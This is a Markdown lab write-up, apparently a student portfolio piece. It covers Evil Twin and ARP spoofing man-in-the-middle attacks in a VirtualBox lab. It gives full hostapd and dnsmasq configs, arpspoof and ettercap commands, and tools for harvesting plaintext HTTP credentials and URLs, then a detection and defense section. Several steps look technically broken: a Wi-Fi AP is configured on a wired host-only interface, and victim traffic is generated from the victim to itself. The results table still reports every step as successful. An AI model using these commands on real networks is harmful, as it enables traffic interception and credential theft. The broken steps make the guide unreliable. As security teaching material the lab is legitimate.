# 🛡️ Wireless Man-in-the-Middle (MITM) Lab: Evil Twin & ARP Spoofing

> **⚠️ Legal Disclaimer:** This lab is for **educational purposes only**. All attacks are performed in an isolated virtual lab environment. Never perform these techniques on networks or systems you do not own or have explicit written permission to test. Unauthorized interception of network traffic is illegal under the Computer Misuse Act, CFAA, and equivalent laws worldwide.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Learning Objectives](#learning-objectives)
- [Lab Architecture](#lab-architecture)
- [Prerequisites](#prerequisites)
- [Environment Setup](#environment-setup)
- [Part 1: Evil Twin Attack](#part-1-evil-twin-attack)
- [Part 2: ARP Spoofing & Traffic Interception](#part-2-arp-spoofing--traffic-interception)
- [Part 3: Capturing & Analyzing Credentials](#part-3-capturing--analyzing-credentials)
- [Detection & Defense](#detection--defense)
- [Cleanup](#cleanup)
- [Key Takeaways](#key-takeaways)
- [References](#references)

---

## Overview

This lab demonstrates two classic wireless Man-in-the-Middle (MITM) attack techniques used by penetration testers to assess wireless network security:

| Technique | Description |
|---|---|
| **Evil Twin** | Rogue access point that mimics a legitimate Wi-Fi network to lure victims |
| **ARP Spoofing** | Poisoning ARP caches to intercept traffic between a victim and the gateway |

Both attacks are chained together to simulate a realistic wireless MITM scenario — entirely without physical cables — using only VirtualBox VMs.

---

## Learning Objectives

By completing this lab you will be able to:

- ✅ Understand how Evil Twin attacks work and why they are effective
- ✅ Set up a rogue access point using `hostapd` and `dnsmasq`
- ✅ Execute ARP cache poisoning using `arpspoof` and `ettercap`
- ✅ Intercept and analyze unencrypted network traffic with `Wireshark`
- ✅ Capture HTTP credentials in transit
- ✅ Understand detection techniques and defensive countermeasures

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     HOST MACHINE                            │
│                  (Your Physical PC)                         │
│                                                             │
│   ┌─────────────────┐        ┌────────────────────────┐    │
│   │   KALI LINUX    │        │    METASPLOITABLE 2    │    │
│   │  (Attacker VM)  │◄──────►│      (Victim VM)       │    │
│   │                 │        │                        │    │
│   │ • hostapd       │        │ • Running web services │    │
│   │ • dnsmasq       │        │ • HTTP traffic         │    │
│   │ • arpspoof      │        │ • Simulated user       │    │
│   │ • ettercap      │        │                        │    │
│   │ • Wireshark     │        │                        │    │
│   └────────┬────────┘        └────────────────────────┘    │
│            │                                                │
│            │  Host-Only Network: 192.168.56.0/24            │
│            │  vboxnet0                                      │
└────────────┼────────────────────────────────────────────────┘
             │
         [Internet]
      (NAT - Adapter 2)
```

**Network Layout:**

| Machine | Role | IP Address |
|---|---|---|
| Kali Linux | Attacker / Rogue AP | 192.168.56.101 |
| Metasploitable 2 | Victim / Target | 192.168.56.102 |
| vboxnet0 gateway | Virtual Router | 192.168.56.1 |

---

## Prerequisites

### Software Requirements

| Tool | Purpose | Pre-installed on Kali? |
|---|---|---|
| VirtualBox | Virtualization | Host machine |
| Kali Linux VM | Attacker machine | — |
| Metasploitable 2 VM | Victim machine | — |
| `hostapd` | Rogue AP creation | ✅ |
| `dnsmasq` | DHCP/DNS for rogue AP | ✅ |
| `arpspoof` (dsniff) | ARP cache poisoning | ✅ |
| `ettercap` | MITM framework | ✅ |
| `Wireshark` | Packet analysis | ✅ |
| `sslstrip` | SSL downgrade (optional) | ✅ |

### Knowledge Requirements

- Basic Linux command line
- Basic understanding of TCP/IP networking
- Familiarity with ARP protocol
- Basic understanding of Wi-Fi (802.11)

---

## Environment Setup

### Step 1: Verify Both VMs Are Running

Start both VMs in VirtualBox and confirm connectivity:

```bash
# On Kali — ping Metasploitable
ping -c 3 192.168.56.102

# Expected output:
# PING 192.168.56.102: 56 data bytes
# 64 bytes from 192.168.56.102: icmp_seq=0 ttl=64 time=0.5 ms
```

### Step 2: Confirm Metasploitable Services Are Running

```bash
# From Kali — scan Metasploitable for open services
nmap -sV 192.168.56.102

# You should see services including:
# 80/tcp   open  http     Apache httpd 2.2.8
# 21/tcp   open  ftp      vsftpd 2.3.4
# 22/tcp   open  ssh      OpenSSH 4.7p1
# 23/tcp   open  telnet
```

### Step 3: Enable IP Forwarding on Kali

This allows Kali to forward packets between the victim and gateway (essential for MITM):

```bash
# Enable IP forwarding temporarily
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify it's enabled
cat /proc/sys/net/ipv4/ip_forward
# Output should be: 1

# Make it persistent across reboots
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### Step 4: Identify Your Network Interfaces

```bash
ip addr show

# Look for:
# eth0 or enp0s3  → NAT adapter (internet)
# eth1 or enp0s8  → Host-only adapter (lab network) ← use this one
```

---

## Part 1: Evil Twin Attack

An Evil Twin is a rogue Wi-Fi access point that broadcasts the same SSID as a legitimate network. Victims connect to it thinking it's real, giving the attacker full visibility of their traffic.

### 1.1 How Evil Twin Works

```
Legitimate AP         Rogue AP (Evil Twin)
    📶                      📶
  "CorpWifi"             "CorpWifi"  ← same name, stronger signal
      |                       |
  Victim connects to whichever signal is stronger
                              |
                         ATTACKER
                    (sees all victim traffic)
```

### 1.2 Configure hostapd (Rogue AP)

Create the hostapd configuration file:

```bash
sudo nano /etc/hostapd/evil_twin.conf
```

Paste the following configuration:

```ini
# Rogue AP Configuration
interface=eth1          # Your host-only interface
driver=nl80211
ssid=CorpWifi           # SSID to impersonate
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Uncomment below to add WPA2 (for WPA Evil Twin)
# wpa=2
# wpa_passphrase=password123
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
```

### 1.3 Configure dnsmasq (DHCP + DNS for Victims)

Create the dnsmasq configuration:

```bash
sudo nano /etc/dnsmasq_evil.conf
```

```ini
# DHCP server for victims connecting to rogue AP
interface=eth1
dhcp-range=192.168.56.110,192.168.56.150,12h

# DNS — redirect all queries to attacker (for DNS spoofing)
address=/#/192.168.56.101

# DHCP options
dhcp-option=3,192.168.56.1       # Default gateway
dhcp-option=6,192.168.56.101     # DNS server (us)

log-queries
log-dhcp
```

### 1.4 Start the Evil Twin

```bash
# Terminal 1: Start the rogue access point
sudo hostapd /etc/hostapd/evil_twin.conf

# Terminal 2: Start DHCP/DNS service
sudo dnsmasq -C /etc/dnsmasq_evil.conf --no-daemon

# Terminal 3: Monitor who connects
sudo tail -f /var/log/syslog | grep dnsmasq
```

**Expected hostapd output:**
```
Configuration file: /etc/hostapd/evil_twin.conf
Using interface eth1 with hwaddr xx:xx:xx:xx:xx:xx and ssid "CorpWifi"
eth1: AP-ENABLED
```

### 1.5 Verify Rogue AP is Broadcasting

```bash
# Scan for the SSID from another terminal
sudo iwlist eth1 scan | grep -i "corpwifi"
```

---

## Part 2: ARP Spoofing & Traffic Interception

ARP Spoofing exploits the stateless nature of ARP to poison the ARP cache of victims, redirecting their traffic through the attacker's machine.

### 2.1 How ARP Spoofing Works

```
Normal ARP Flow:
  Victim asks: "Who has 192.168.56.1 (gateway)?"
  Gateway replies: "I do — my MAC is AA:BB:CC:DD:EE:FF"
  Victim stores: 192.168.56.1 → AA:BB:CC:DD:EE:FF ✅

ARP Spoofing:
  Attacker continuously sends: "192.168.56.1 is at MY MAC"
  Victim stores: 192.168.56.1 → ATTACKER MAC ❌ (poisoned!)
  All victim traffic now flows through attacker first
```

### 2.2 Identify Target IPs

```bash
# On Kali — identify machines on the network
sudo netdiscover -i eth1 -r 192.168.56.0/24

# Or use nmap
sudo nmap -sn 192.168.56.0/24

# Note down:
# Victim IP:  192.168.56.102 (Metasploitable)
# Gateway IP: 192.168.56.1   (vboxnet0)
```

### 2.3 Execute ARP Poisoning with arpspoof

Open two terminals and run both commands simultaneously:

```bash
# Terminal A: Tell the VICTIM that WE are the gateway
sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1

# Terminal B: Tell the GATEWAY that WE are the victim
sudo arpspoof -i eth1 -t 192.168.56.1 192.168.56.102
```

**What this does:**
- Terminal A sends fake ARP replies to Metasploitable: *"The gateway (192.168.56.1) is at Kali's MAC"*
- Terminal B sends fake ARP replies to the gateway: *"The victim (192.168.56.102) is at Kali's MAC"*
- All traffic between them now flows through Kali

### 2.4 Verify ARP Cache is Poisoned

```bash
# SSH into Metasploitable from another terminal
ssh msfadmin@192.168.56.102
# password: msfadmin

# Check the ARP cache on Metasploitable
arp -n

# BEFORE poisoning:
# 192.168.56.1    ether  aa:bb:cc:dd:ee:ff  (gateway's real MAC)

# AFTER poisoning:
# 192.168.56.1    ether  xx:xx:xx:xx:xx:xx  ← Kali's MAC! (poisoned)
```

### 2.5 Alternative: Use Ettercap for Full MITM

Ettercap automates ARP poisoning and traffic interception in one tool:

```bash
# Launch ettercap in text mode
sudo ettercap -T -i eth1 -M arp:remote /192.168.56.102// /192.168.56.1//

# Flags explained:
# -T          → text interface
# -i eth1     → use this interface
# -M arp      → MITM via ARP poisoning
# :remote     → also intercept routed traffic
# /victim//   → target 1
# /gateway//  → target 2
```

Or use the GUI version:

```bash
sudo ettercap -G
```

Navigate to: `Hosts → Scan for Hosts → Hosts List → Add to Target 1/2 → MITM → ARP Poisoning`

---

## Part 3: Capturing & Analyzing Credentials

With MITM established, now capture and analyze the intercepted traffic.

### 3.1 Start Wireshark

```bash
sudo wireshark &
```

1. Select interface **eth1**
2. Start capture
3. Apply filter: `http` to see only HTTP traffic

### 3.2 Generate Victim Traffic

From Metasploitable (or simulate from Kali acting as victim):

```bash
# On Metasploitable — browse to a web service
curl http://192.168.56.102/dvwa/login.php \
  -d "username=admin&password=password&Login=Login"

# Or use wget
wget -qO- http://192.168.56.102/mutillidae/
```

### 3.3 Capture HTTP Credentials in Wireshark

In Wireshark, filter for HTTP POST requests:

```
http.request.method == "POST"
```

Right-click a POST packet → **Follow → HTTP Stream**

You will see plaintext credentials:

```
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.102
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login
```

### 3.4 Use Driftnet to Capture Images in Transit

```bash
# Capture images passing through the MITM channel
sudo driftnet -i eth1
```

A window opens showing all images being transmitted over HTTP in real time.

### 3.5 Use urlsnarf to Log Visited URLs

```bash
# Log all URLs visited by the victim
sudo urlsnarf -i eth1
```

Output:
```
192.168.56.102 - - [31/May/2026:11:30:00] "GET http://192.168.56.102/dvwa/ HTTP/1.1"
192.168.56.102 - - [31/May/2026:11:30:05] "POST http://192.168.56.102/dvwa/login.php HTTP/1.1"
```

### 3.6 Save Captured Traffic for Analysis

```bash
# Save capture to file for later analysis
sudo tcpdump -i eth1 -w /tmp/mitm_capture.pcap

# Analyze later with:
wireshark /tmp/mitm_capture.pcap
# or
tcpdump -r /tmp/mitm_capture.pcap -A | grep -i "password\|user\|login"
```

---

## Detection & Defense

Understanding how these attacks are detected is as important as executing them.

### Detecting Evil Twin

| Detection Method | How It Works |
|---|---|
| **WIDS (Wireless IDS)** | Tools like Kismet detect duplicate SSIDs with different BSSIDs |
| **802.11w (Management Frame Protection)** | Cryptographically signs management frames, preventing rogue APs |
| **SSID Pinning** | Enterprise clients remember trusted AP MAC addresses |
| **Certificate-based auth (EAP-TLS)** | Client verifies server certificate — rogue AP can't fake it |

```bash
# Detect rogue APs with Kismet on Kali
sudo kismet -c eth1
# Look for: "SSID Spoofing" or duplicate SSIDs with different BSSIDs
```

### Detecting ARP Spoofing

```bash
# Method 1: Check for duplicate MACs in ARP table
arp -n | awk '{print $3}' | sort | uniq -d
# Duplicate MAC = ARP poisoning in progress

# Method 2: Use arpwatch to monitor ARP changes
sudo arpwatch -i eth1
# Sends alerts when MAC-IP mappings change unexpectedly

# Method 3: XArp (GUI ARP monitor)
sudo apt install xarp
sudo xarp
```

### Defensive Countermeasures

| Attack | Defense |
|---|---|
| Evil Twin | Use WPA2-Enterprise with certificate validation |
| ARP Spoofing | Enable Dynamic ARP Inspection (DAI) on managed switches |
| Credential theft | Use HTTPS / TLS everywhere (HTTP credentials are visible) |
| DNS hijacking | Use DNSSEC, DNS over HTTPS (DoH) |
| Traffic interception | End-to-end encryption (VPN, TLS 1.3) |

```bash
# Protect against ARP spoofing — add static ARP entry for gateway
sudo arp -s 192.168.56.1 aa:bb:cc:dd:ee:ff

# Use a VPN to encrypt all traffic even on compromised networks
sudo openvpn --config your_vpn.ovpn
```

---

## Cleanup

Always clean up after a penetration test:

```bash
# Stop arpspoof (Ctrl+C in both terminals)
# Then restore ARP tables
sudo arpspoof -i eth1 -t 192.168.56.102 192.168.56.1  # Ctrl+C to stop

# Manually restore ARP on victim (if needed)
# SSH into Metasploitable
sudo arp -d 192.168.56.1   # Delete poisoned entry (it will refresh correctly)

# Stop hostapd and dnsmasq
sudo killall hostapd
sudo killall dnsmasq

# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Remove config files
sudo rm /etc/hostapd/evil_twin.conf
sudo rm /etc/dnsmasq_evil.conf
```

---

## Key Takeaways

1. **Evil Twin attacks are trivial to execute** on open or WPA-PSK networks — anyone with a laptop can do this in a coffee shop
2. **ARP has no authentication** — it was designed for trusted networks; poisoning it requires no credentials
3. **HTTP traffic is completely transparent** to a MITM attacker — never send credentials over HTTP
4. **HTTPS does NOT protect you** if the attacker uses SSLstrip on an unpatched client
5. **VPNs are your best defence** on untrusted networks — they encrypt traffic before it even reaches the network layer
6. **Detection is possible** — WIDS, arpwatch, and certificate pinning are practical defences in enterprise environments

---

## Lab Results Summary

| Test | Result | Evidence |
|---|---|---|
| Evil Twin AP created | ✅ | hostapd broadcast confirmed |
| DHCP assigned to victims | ✅ | dnsmasq leases log |
| ARP cache poisoned | ✅ | Victim ARP table shows Kali MAC for gateway |
| HTTP traffic intercepted | ✅ | Credentials visible in Wireshark |
| URLs logged | ✅ | urlsnarf output captured |
| Cleanup completed | ✅ | ARP restored, services stopped |

---

## References

- [hostapd documentation](https://w1.fi/hostapd/)
- [Ettercap Project](https://www.ettercap-project.org/)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [OWASP: Man-in-the-Middle Attack](https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack)
- [RFC 826 — ARP Protocol](https://datatracker.ietf.org/doc/html/rfc826)
- [IEEE 802.11w — Management Frame Protection](https://en.wikipedia.org/wiki/IEEE_802.11w-2009)
- Offensive Security — [Kali Linux Documentation](https://www.kali.org/docs/)

---

## Author

**Andrew Mwine** | Cybersecurity Lab Portfolio  
*Tools used: Kali Linux · Metasploitable 2 · VirtualBox · hostapd · ettercap · Wireshark*

> 🔒 *All techniques demonstrated in an isolated lab environment for educational purposes only.*
